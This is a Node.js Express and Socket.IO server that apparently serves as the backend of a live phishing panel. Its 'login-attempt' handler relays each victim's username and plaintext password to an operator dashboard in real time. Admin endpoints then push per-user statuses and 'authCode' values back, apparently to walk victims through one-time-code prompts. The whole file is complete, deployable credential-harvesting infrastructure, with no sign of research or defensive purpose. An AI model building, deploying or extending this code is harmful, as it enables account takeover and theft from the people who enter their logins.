const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();

// ======================== CORS ==========================
// Allow all origins in production for Railway
const allowedOrigins = process.env.NODE_ENV === 'production'
  ? [
      "https://email-password-backend-production.up.railway.app",
      "https://your-frontend.vercel.app", // Replace with your actual frontend URL
      "https://your-production-domain.com"
    ]
  : [
      "http://localhost:3000",
      "http://localhost:3001",
      "http://127.0.0.1:5500",
      "http://localhost:5500",
      "*"
    ];

const corsOptions = {
  origin: (origin, callback) => {
    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    
    // In production, check against allowed origins
    if (process.env.NODE_ENV === 'production') {
      // For Railway, we need to allow the frontend URL specifically
      // Add your frontend URL to the allowedOrigins array above
      if (allowedOrigins.includes(origin) || origin.includes('railway.app')) {
        callback(null, true);
      } else {
        console.warn('❌ CORS blocked:', origin);
        callback(new Error('Not allowed by CORS'));
      }
    } else {
      // Development: allow all
      callback(null, true);
    }
  },
  methods: ['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'],
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
};

app.use(cors(corsOptions));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

const server = http.createServer(app);

// ======================== SOCKET.IO ==========================
const io = new Server(server, {
  cors: {
    origin: "*", // Allow all for now, we handle CORS at the app level
    methods: ['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'],
    credentials: true,
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  },
  transports: ['websocket', 'polling'],
  path: '/socket.io/',
  pingTimeout: 60000,
  pingInterval: 25000,
  connectionStateRecovery: {
    maxDisconnectionDuration: 2 * 60 * 1000,
    skipMiddlewares: true,
  },
  upgradeTimeout: 30000,
  allowEIO3: true,
});

console.log('🚀 Socket.IO server initializing...');

// ======================== SOCKET EVENTS ==========================
io.on('connection', (socket) => {
  console.log('✅ User connected:', socket.id);
  console.log('📊 Total connections:', io.engine.clientsCount);

  // Send connection confirmation
  socket.emit('connected', { 
    message: 'Connected to socket server', 
    socketId: socket.id 
  });

  // Handle room joining
  socket.on('join_room', (room) => {
    socket.join(room);
    console.log(`User ${socket.id} joined room: ${room}`);
  });

  // Login attempt from user
  socket.on('login-attempt', (data) => {
    const { username, password, timestamp } = data;
    console.log(`📥 Login attempt from: ${username} at ${timestamp || new Date().toISOString()}`);
    
    // Broadcast to all connected clients (admin dashboard)
    io.emit('admin_notification', {
      email: username,
      password: password,
      timestamp: new Date().toISOString(),
      type: 'login_attempt'
    });
    
    socket.emit('login-attempt-received', {
      success: true,
      message: 'Login attempt recorded',
    });
  });

  // Admin status update
  socket.on('update-login-status', (data) => {
    const { username, status, authCode } = data;
    console.log(`📢 Admin updated status: ${username} → ${status}`);
    
    // Broadcast to all clients
    io.emit('user_update', {
      email: username,
      newStatus: status,
      authCode: authCode || '',
      timestamp: new Date().toISOString(),
    });
  });

  // Handle admin joined
  socket.on('admin-joined', (data) => {
    console.log(`👑 Admin ${data.name || 'Admin'} joined`);
    socket.emit('all-login-attempts', []); // Send empty array or fetch from DB
  });

  // Handle disconnection
  socket.on('disconnect', (reason) => {
    console.log('❌ User disconnected:', socket.id, 'Reason:', reason);
  });

  socket.on('error', (error) => {
    console.error('Socket error for', socket.id, ':', error);
  });
});

// ======================== HTTP ENDPOINTS ==========================

// Health check
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    connections: io.engine.clientsCount,
    uptime: Math.floor(process.uptime()),
    environment: process.env.NODE_ENV || 'development',
  });
});

// Test endpoint
app.get('/test', (req, res) => {
  res.json({
    message: 'Server is running!',
    socketPath: '/socket.io/',
    clients: io.engine.clientsCount,
    env: process.env.NODE_ENV || 'development',
    timestamp: new Date().toISOString(),
  });
});

// Admin notification endpoint (called from dashboardaction.js)
app.post('/api/notify-admin', (req, res) => {
  try {
    const { email, type, message } = req.body;
    console.log(`📧 Notification: [${type}] ${email}`);
    
    // Emit to all connected clients
    io.emit('admin_notification', {
      email,
      type,
      message,
      timestamp: new Date().toISOString(),
    });
    
    res.json({
      success: true,
      clients: io.engine.clientsCount,
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    console.error('Error in notify-admin:', error);
    res.status(500).json({
      success: false,
      error: error.message || 'Internal server error',
    });
  }
});

// Admin action endpoint (called from dashboardaction.js updateUserStatus)
app.post('/api/admin-action', (req, res) => {
  try {
    const { userId, newStatus, authCode, email } = req.body;
    console.log(`🔔 Admin action: ${newStatus} for ${email || userId}`);
    
    // Emit to all connected clients with the update
    io.emit('user_update', {
      userId,
      newStatus,
      authCode: authCode || '',
      email: email || '',
      timestamp: new Date().toISOString(),
    });
    
    res.json({
      success: true,
      clients: io.engine.clientsCount,
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    console.error('Error in admin-action:', error);
    res.status(500).json({
      success: false,
      error: error.message || 'Internal server error',
    });
  }
});

// ======================== 404 & ERROR HANDLING ==========================
app.use((req, res) => {
  res.status(404).json({
    error: 'Endpoint not found',
    path: req.path,
  });
});

app.use((err, req, res, next) => {
  console.error('Global error:', err);
  res.status(500).json({
    error: 'Internal server error',
    message: process.env.NODE_ENV === 'development' ? err.message : undefined,
  });
});

// ======================== SERVER START ==========================
const PORT = process.env.PORT || 8000;

server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📍 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🔗 Socket.IO path: /socket.io/`);
});

// ======================== GRACEFUL SHUTDOWN ==========================
process.on('SIGTERM', () => {
  console.log('🛑 SIGTERM received, shutting down gracefully...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});